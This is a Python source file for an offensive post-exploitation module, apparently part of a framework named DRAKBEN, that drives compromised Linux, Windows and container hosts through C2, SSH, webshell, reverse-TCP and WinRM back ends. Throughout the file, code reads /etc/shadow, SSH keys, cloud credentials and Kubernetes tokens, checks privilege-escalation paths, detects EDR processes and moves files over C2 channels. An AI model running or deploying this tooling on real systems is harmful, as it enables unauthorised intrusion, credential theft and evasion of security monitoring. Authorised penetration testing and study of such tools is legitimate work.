"""DRAKBEN Post-Exploitation Module (2026 Edition)
Description: Advanced looting, privilege escalation check, and persistence module.
             Supports Linux, Windows, and Container environments.
             Fully AsyncIO compliant.

Table of Tactics:
- Linux: eBPF check, SUID/Capabilities, SSH/Cloud Keys, Systemd Persistence.
- Windows: Token Enumeration, SAM/SYSTEM Hive access, Hidden Scheduled Tasks.
- Containers: K8s ServiceAccount token, dangerous caps (CAP_SYS_ADMIN), Breakout detection.

Author: @ahmetdrak
"""

import logging
from abc import ABC, abstractmethod
from typing import Any

logger = logging.getLogger(__name__)

_NO_SUCH_FILE = "No such file"

# =============================================================================
# ABSTRACTION LAYER
# =============================================================================


class ShellInterface(ABC):
    """Abstract interface for interacting with a compromised shell."""

    @abstractmethod
    async def execute(self, cmd: str) -> str:
        pass

    @abstractmethod
    async def upload(self, data: bytes, remote_path: str) -> bool:
        pass

    @abstractmethod
    async def download(self, remote_path: str) -> bytes | None:
        pass


# =============================================================================
# LINUX POST-EXPLOITATION
# =============================================================================


class LinuxPostExploit:
    """Linux advanced post-exploitation engine."""

    SENSITIVE_FILES = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/sudoers",
        "/etc/kubernetes/admin.conf",
        "/home/*/.ssh/id_rsa",
        "/home/*/.aws/credentials",
        "/home/*/.kube/config",
        "/proc/self/environ",  # Container env loot
    ]

    def __init__(self, shell: ShellInterface) -> None:
        self.shell = shell

    async def run_all(self) -> dict[str, Any]:
        """Run full post-exploit suite."""
        return {
            "sysinfo": await self.get_sysinfo(),
            "users": await self.enum_users(),
            "network": await self.enum_network(),
            "privesc": await self.check_privesc(),
            "container": await self.check_container_env(),
            "loot": [],  # Populated by loot_files
        }

    async def get_sysinfo(self) -> dict[str, str]:
        uname = await self.shell.execute("uname -a")
        distro = await self.shell.execute("cat /etc/*release")
        init = await self.shell.execute("ls -l /sbin/init")  # Check systemd/other
        return {"kernel": uname.strip(), "distro": distro.strip(), "init": init.strip()}

    async def enum_users(self) -> list[str]:
        data = await self.shell.execute("cat /etc/passwd | cut -d: -f1,3,7")
        # Parse output properly
        users = [
            line.strip()
            for line in data.splitlines()
            if "/bin/bash" in line or "/bin/sh" in line or "1000" in line
        ]
        return users

    async def enum_network(self) -> str:
        # Try modern 'ip' then legacy 'ifconfig'
        out = await self.shell.execute("ip a || ifconfig")
        # Check listening ports (ss is faster/modern than netstat)
        ports = await self.shell.execute("ss -tulpn || netstat -tulpn")
        return f"{out}\n\nLISTENING PORTS:\n{ports}"

    async def check_privesc(self) -> list[dict[str, Any]]:
        vectors = []

        # 1. Sudo access (requires password usually, but check for NOPASSWD)
        sudo = await self.shell.execute("sudo -l -n 2>/dev/null")
        if "NOPASSWD" in sudo:
            vectors.append(
                {"type": "SUDO", "details": sudo.strip(), "rating": "CRITICAL"},
            )

        # 2. SUID Binaries
        suid = await self.shell.execute(
            r"find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null",
        )
        if suid:
            cleaned = [x for x in suid.splitlines() if x]
            vectors.append(
                {
                    "type": "SUID",
                    "count": len(cleaned),  # type: ignore[dict-item]
                    "sample": cleaned[:5],  # type: ignore[dict-item]
                    "rating": "HIGH",
                },
            )

        # 3. Capabilities (Modern SUID replacement)
        caps = await self.shell.execute("getcap -r / 2>/dev/null")
        if caps:
            vectors.append(
                {"type": "CAPABILITIES", "details": caps.strip(), "rating": "MEDIUM"},
            )

        # 4. Kernel Exploits (DirtyPipe check)
        uname = await self.shell.execute("uname -r")
        if "5.8" in uname or "5.10" in uname or "5.16" in uname:  # Rough check
            vectors.append(
                {
                    "type": "KERNEL_VULN",
                    "name": "DirtyPipe (Possible)",
                    "rating": "CRITICAL",
                },
            )

        # 5. eBPF Potential (2025 stealth vector)
        ebpf_check = await self.shell.execute("sysctl kernel.unprivileged_bpf_disabled")
        if " = 0" in ebpf_check:
            vectors.append(
                {
                    "type": "eBPF",
                    "details": "Unprivileged eBPF allowed",
                    "rating": "HIGH",
                },
            )

        return vectors

    async def check_container_env(self) -> dict[str, Any]:
        """Detect Docker/K8s and potential escape vectors."""
        is_container = False
        details = []

        # 1. .dockerenv check
        check1 = await self.shell.execute("ls -la /.dockerenv")
        if _NO_SUCH_FILE not in check1:
            is_container = True
            details.append("Found /.dockerenv")

        # 2. Cgroups check
        cgroups = await self.shell.execute("cat /proc/1/cgroup")
        if "docker" in cgroups or "kubepods" in cgroups:
            is_container = True
            details.append("Cgroup analysis confirmed container")

        # 3. K8s Service Account (Loot!)
        k8s_token = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        token_check = await self.shell.execute(f"cat {k8s_token}")
        found_k8s = False
        if _NO_SUCH_FILE not in token_check and len(token_check) > 10:
            found_k8s = True
            details.append("K8s Service Account Token FOUND!")
            # Save token logic here (elided for brevity)

        if found_k8s:
            env_type = "Kubernetes"
        elif is_container:
            env_type = "Docker"
        else:
            env_type = "Host"

        return {
            "is_container": is_container,
            "environment": env_type,
            "details": details,
        }


# =============================================================================
# WINDOWS POST-EXPLOITATION
# =============================================================================


class WindowsPostExploit:
    """Windows advanced post-exploitation engine."""

    def __init__(self, shell: ShellInterface) -> None:
        self.shell = shell

    async def run_all(self) -> dict[str, Any]:
        return {
            "sysinfo": await self.get_sysinfo(),
            "users": await self.enum_users(),
            "av_edr": await self.enum_security(),
            "privesc": await self.check_privesc(),
            "loot": "Not implemented (requires extensive powershell reflection)",
        }

    async def get_sysinfo(self) -> str:
        return await self.shell.execute(
            'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"',
        )

    async def enum_users(self) -> str:
        return await self.shell.execute("net users")

    async def enum_security(self) -> dict[str, list[str]]:
        # Check active AV/EDR processes
        tasklist = await self.shell.execute("tasklist /SVC")
        edr_list = [
            "MsMpEng.exe",
            "cb.exe",
            "cybereason.exe",
            "sentinel.exe",
            "xagt.exe",
        ]
        found = [proc for proc in edr_list if proc.lower() in tasklist.lower()]
        return {"edr_found": found}

    async def check_privesc(self) -> list[dict[str, Any]]:
        vectors = []

        # 1. AlwaysInstallElevated
        reg = await self.shell.execute(
            "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        )
        if "0x1" in reg:
            vectors.append(
                {
                    "type": "REGISTRY",
                    "details": "AlwaysInstallElevated is ON",
                    "rating": "HIGH",
                },
            )

        # 2. Token Privileges
        whoami = await self.shell.execute("whoami /priv")
        if "SeDebugPrivilege" in whoami:
            vectors.append(
                {
                    "type": "TOKEN",
                    "details": "SeDebugPrivilege detected (Mimikatz possible)",
                    "rating": "CRITICAL",
                },
            )
        if "SeImpersonatePrivilege" in whoami:
            vectors.append(
                {
                    "type": "TOKEN",
                    "details": "SeImpersonatePrivilege (Potatoes/PrintSpoofer)",
                    "rating": "CRITICAL",
                },
            )

        return vectors


# =============================================================================
# MAIN INTERFACE
# =============================================================================


class PostExploitEngine:
    """Central interface for post-exploitation."""

    def __init__(self, shell: ShellInterface, os_type: str = "linux") -> None:
        self.shell = shell
        self.os_type = os_type.lower()

        if "linux" in self.os_type:
            self.module = LinuxPostExploit(shell)  # type: ignore[assignment]
        elif "windows" in self.os_type:
            self.module = WindowsPostExploit(shell)  # type: ignore[assignment]
        else:
            msg = f"Unsupported OS: {os_type}"
            raise ValueError(msg)

    async def run(self) -> Any:
        logger.info("Starting Post-Exploit on %s", self.os_type)
        return await self.module.run_all()


# Helper for C2 Framework to wrap its connection
class C2ShellWrapper(ShellInterface):
    """Wraps C2 connection to act as shell."""

    def __init__(self, c2_session) -> None:
        self.session = c2_session

    async def execute(self, cmd: str) -> str:
        # Placeholder for C2 execute logic
        return await self.session.send_command(cmd)

    async def upload(self, data: bytes, remote_path: str) -> bool:
        """Upload data to remote host via C2 session.

        Encodes data as base64 and writes it through a shell command
        to avoid binary transfer issues over text-based C2 channels.
        """
        import base64

        encoded = base64.b64encode(data).decode("ascii")
        # Write in chunks to avoid shell command length limits
        chunk_size = 4096
        chunks = [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        # First chunk overwrites, subsequent ones append
        for idx, chunk in enumerate(chunks):
            op = ">" if idx == 0 else ">>"
            result = await self.session.send_command(
                f"printf '%s' '{chunk}' {op} /tmp/.drak_upload_b64",
            )
            if result and "error" in result.lower():
                logger.warning("Upload chunk %d failed: %s", idx, result)
                return False

        # Decode on target
        await self.session.send_command(
            f"base64 -d /tmp/.drak_upload_b64 > {remote_path} && rm -f /tmp/.drak_upload_b64",
        )
        logger.info("Uploaded %d bytes to %s", len(data), remote_path)
        return True

    async def download(self, remote_path: str) -> bytes | None:
        """Download file from remote host via C2 session.

        Reads the file as base64 through the C2 channel and decodes locally.
        """
        import base64

        result = await self.session.send_command(f"base64 {remote_path}")
        if not result or _NO_SUCH_FILE in result or "error" in result.lower():
            logger.warning("Download failed for %s: %s", remote_path, result)
            return None

        try:
            data = base64.b64decode(result.strip())
            logger.info("Downloaded %d bytes from %s", len(data), remote_path)
            return data
        except Exception as e:
            logger.warning("Base64 decode failed for %s: %s", remote_path, e)
            return None


# =============================================================================
# CONCRETE SHELL IMPLEMENTATIONS
# =============================================================================


class SSHShell(ShellInterface):
    """SSH-based shell implementation using paramiko."""

    def __init__(
        self,
        host: str,
        username: str,
        password: str | None = None,
        key_path: str | None = None,
        port: int = 22,
    ) -> None:
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.key_path = key_path
        self._client = None

    async def _ensure_connected(self) -> None:
        """Ensure SSH connection is established."""
        if self._client is not None:
            return

        # Use asyncio.Lock to prevent duplicate connections
        if not hasattr(self, "_connect_lock"):
            import asyncio
            self._connect_lock = asyncio.Lock()

        async with self._connect_lock:
            # Double-check after acquiring lock
            if self._client is not None:
                return

            try:
                import paramiko
            except ImportError:
                logger.error("paramiko not installed. Run: pip install paramiko")
                raise

            import asyncio

        def _connect():
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            connect_kwargs = {
                "hostname": self.host,
                "port": self.port,
                "username": self.username,
            }

            if self.key_path:
                connect_kwargs["key_filename"] = self.key_path
            elif self.password:
                connect_kwargs["password"] = self.password

            client.connect(**connect_kwargs)
            return client

        self._client = await asyncio.to_thread(_connect)  # type: ignore[func-returns-value]

    async def execute(self, cmd: str) -> str:
        """Execute command over SSH."""
        import asyncio

        await self._ensure_connected()

        def _exec():
            _, stdout, stderr = self._client.exec_command(cmd, timeout=30)
            out = stdout.read().decode("utf-8", errors="replace")
            err = stderr.read().decode("utf-8", errors="replace")
            return out + err

        return await asyncio.to_thread(_exec)

    async def upload(self, data: bytes, remote_path: str) -> bool:
        """Upload file via SFTP."""
        import asyncio

        await self._ensure_connected()

        def _upload():
            sftp = self._client.open_sftp()
            with sftp.file(remote_path, "wb") as f:
                f.write(data)
            sftp.close()
            return True

        try:
            return await asyncio.to_thread(_upload)
        except Exception as e:
            logger.error("SSH upload failed: %s", e)
            return False

    async def download(self, remote_path: str) -> bytes | None:
        """Download file via SFTP."""
        import asyncio

        await self._ensure_connected()

        def _download():
            sftp = self._client.open_sftp()
            with sftp.file(remote_path, "rb") as f:
                data = f.read()
            sftp.close()
            return data

        try:
            return await asyncio.to_thread(_download)
        except Exception as e:
            logger.error("SSH download failed: %s", e)
            return None

    def close(self) -> None:
        """Close SSH connection."""
        if self._client:
            self._client.close()
            self._client = None

    def __enter__(self) -> "SSHShell":
        """Enter context manager."""
        return self

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        """Exit context manager, closing SSH connection."""
        self.close()

    async def __aenter__(self) -> "SSHShell":
        """Enter async context manager."""
        await self._ensure_connected()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb) -> None:
        """Exit async context manager, closing SSH connection."""
        self.close()


class WebShell(ShellInterface):
    """HTTP-based webshell implementation."""

    def __init__(
        self,
        url: str,
        method: str = "POST",
        cmd_param: str = "cmd",
        password_param: str | None = None,
        password: str | None = None,
        headers: dict[str, str] | None = None,
    ) -> None:
        self.url = url
        self.method = method.upper()
        self.cmd_param = cmd_param
        self.password_param = password_param
        self.password = password
        self.headers = headers or {"User-Agent": "Mozilla/5.0"}

    async def execute(self, cmd: str) -> str:
        """Execute command via webshell.

        Note: SSL verification disabled for pentesting targets (self-signed certs).
        This is intentional for penetration testing purposes.
        """
        import aiohttp

        data = {self.cmd_param: cmd}
        if self.password_param and self.password:
            data[self.password_param] = self.password

        # Note: ssl=False is intentional for pentesting targets with self-signed certs
        # This is a security tool designed to interact with compromised systems
        connector = aiohttp.TCPConnector(ssl=False)

        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                if self.method == "POST":
                    async with session.post(
                        self.url,
                        data=data,
                        headers=self.headers,
                        timeout=aiohttp.ClientTimeout(total=30),
                    ) as resp:
                        return await resp.text()
                else:
                    async with session.get(
                        self.url,
                        params=data,
                        headers=self.headers,
                        timeout=aiohttp.ClientTimeout(total=30),
                    ) as resp:
                        return await resp.text()
        except (aiohttp.ClientError, OSError) as e:
            logger.error("WebShell execute failed: %s", e)
            return f"ERROR: {e}"

    async def upload(self, data: bytes, remote_path: str) -> bool:
        """Upload file via webshell (base64 encoded)."""
        import base64

        b64_data = base64.b64encode(data).decode()
        # Use echo with base64 decode
        cmd = f"echo '{b64_data}' | base64 -d > {remote_path}"
        result = await self.execute(cmd)
        return "error" not in result.lower()

    async def download(self, remote_path: str) -> bytes | None:
        """Download file via webshell (base64 encoded)."""
        import base64

        cmd = f"cat {remote_path} | base64"
        result = await self.execute(cmd)

        try:
            return base64.b64decode(result.strip())
        except Exception as e:
            logger.error("WebShell download decode failed: %s", e)
            return None


class ReverseTCPShell(ShellInterface):
    """Reverse TCP shell handler."""

    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self._reader = None
        self._writer = None
        self._server = None

    async def _ensure_connected(self) -> None:
        """Start listener and wait for connection."""
        import asyncio

        if self._reader is not None:
            return

        server = await asyncio.start_server(
            self._handle_connection, self.host, self.port,
        )
        self._server = server  # type: ignore[assignment]

        logger.info("Listening on %s:%s for reverse shell...", self.host, self.port)

        # Wait for first connection (timeout 60s)
        try:
            await asyncio.wait_for(self._wait_for_connection(), timeout=60)
        except TimeoutError:
            server.close()
            msg = "No reverse shell connection received"
            raise TimeoutError(msg) from None

    async def _handle_connection(
        self, reader, writer,
    ) -> None:
        """Handle incoming connection (async callback for asyncio server)."""
        import asyncio

        self._reader = reader
        self._writer = writer
        addr = writer.get_extra_info("peername")
        logger.info("Reverse shell connected from %s", addr)
        # Ensure the connection is drained to complete the handshake
        await asyncio.sleep(0)

    async def _wait_for_connection(self) -> None:
        """Wait until connection is established."""
        import asyncio

        while self._reader is None:
            await asyncio.sleep(0.1)

    async def execute(self, cmd: str) -> str:
        """Execute command on reverse shell."""
        import asyncio

        await self._ensure_connected()

        # Send command
        self._writer.write(f"{cmd}\n".encode())
        await self._writer.drain()

        # Read response (with timeout)
        await asyncio.sleep(0.5)  # Wait for command execution
        try:
            data = await asyncio.wait_for(self._reader.read(65536), timeout=10)
            return data.decode("utf-8", errors="replace")
        except TimeoutError:
            return ""

    async def upload(self, data: bytes, remote_path: str) -> bool:
        """Upload via echo command (limited size)."""
        import base64

        b64 = base64.b64encode(data).decode()
        cmd = f"echo '{b64}' | base64 -d > {remote_path}"
        result = await self.execute(cmd)
        return "error" not in result.lower() if result else False

    async def download(self, remote_path: str) -> bytes | None:
        """Download via cat command."""
        import base64

        result = await self.execute(f"cat {remote_path} | base64")
        try:
            return base64.b64decode(result.strip())
        except Exception as e:
            logger.debug("Base64 decode failed for %s: %s", remote_path, e)
            return None

    def close(self) -> None:
        """Close connection and server."""
        if self._writer:
            self._writer.close()
            self._writer = None
            self._reader = None
        if self._server:
            self._server.close()
            self._server = None


class WinRMShell(ShellInterface):
    """WinRM-based shell for Windows targets."""

    def __init__(
        self,
        host: str,
        username: str,
        password: str,
        port: int = 5985,
        ssl: bool = False,
    ) -> None:
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.ssl = ssl
        self._session = None

    async def _ensure_connected(self) -> None:
        """Ensure WinRM session is established."""
        if self._session is not None:
            return

        try:
            import winrm
        except ImportError:
            logger.error("pywinrm not installed. Run: pip install pywinrm")
            raise

        import asyncio

        def _connect():
            protocol = "https" if self.ssl else "http"
            endpoint = f"{protocol}://{self.host}:{self.port}/wsman"
            return winrm.Session(
                endpoint,
                auth=(self.username, self.password),
                transport="ntlm",
            )

        self._session = await asyncio.to_thread(_connect)  # type: ignore[func-returns-value]

    async def execute(self, cmd: str) -> str:
        """Execute PowerShell command via WinRM."""
        import asyncio

        await self._ensure_connected()

        def _exec():
            result = self._session.run_ps(cmd)
            return result.std_out.decode("utf-8", errors="replace") + \
                   result.std_err.decode("utf-8", errors="replace")

        return await asyncio.to_thread(_exec)

    async def upload(self, data: bytes, remote_path: str) -> bool:
        """Upload file via PowerShell."""
        import base64

        b64 = base64.b64encode(data).decode()
        ps_cmd = f"[IO.File]::WriteAllBytes('{remote_path}', [Convert]::FromBase64String('{b64}'))"
        result = await self.execute(ps_cmd)
        return "error" not in result.lower() if result else False

    async def download(self, remote_path: str) -> bytes | None:
        """Download file via PowerShell."""
        import base64

        ps_cmd = f"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{remote_path}'))"
        result = await self.execute(ps_cmd)

        try:
            return base64.b64decode(result.strip())
        except Exception as e:
            logger.error("WinRM download failed: %s", e)
            return None
